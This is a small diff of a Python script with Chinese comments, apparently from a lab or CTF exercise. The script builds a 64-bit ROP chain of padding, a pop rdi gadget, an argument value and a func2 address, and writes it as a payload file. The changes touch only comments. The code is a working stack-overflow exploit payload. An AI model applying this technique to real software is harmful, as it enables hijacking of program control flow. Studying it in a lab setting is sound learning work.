@@ -13,14 +13,13 @@ arg1_value = 0x3f8
 # 4. 目标函数 func2 的地址
 func2_addr = 0x401216
 
-# 5. 构造 ROP 链 (64位小端序)
-# [ Padding ] + [ pop_rdi_addr ] + [ 参数值 ] + [ func2_addr ]
+# 5. 构造 ROP 链 (64位小端序):[ Padding ] + [ pop_rdi_addr ] + [ 参数值 ] + [ func2_addr ]
 payload = padding
 payload += struct.pack('<Q', pop_rdi_ret_addr)
 payload += struct.pack('<Q', arg1_value)
 payload += struct.pack('<Q', func2_addr)
 
-# 写入文件
+# 写入
 with open("ans2.txt", "wb") as f:
     f.write(payload)
 
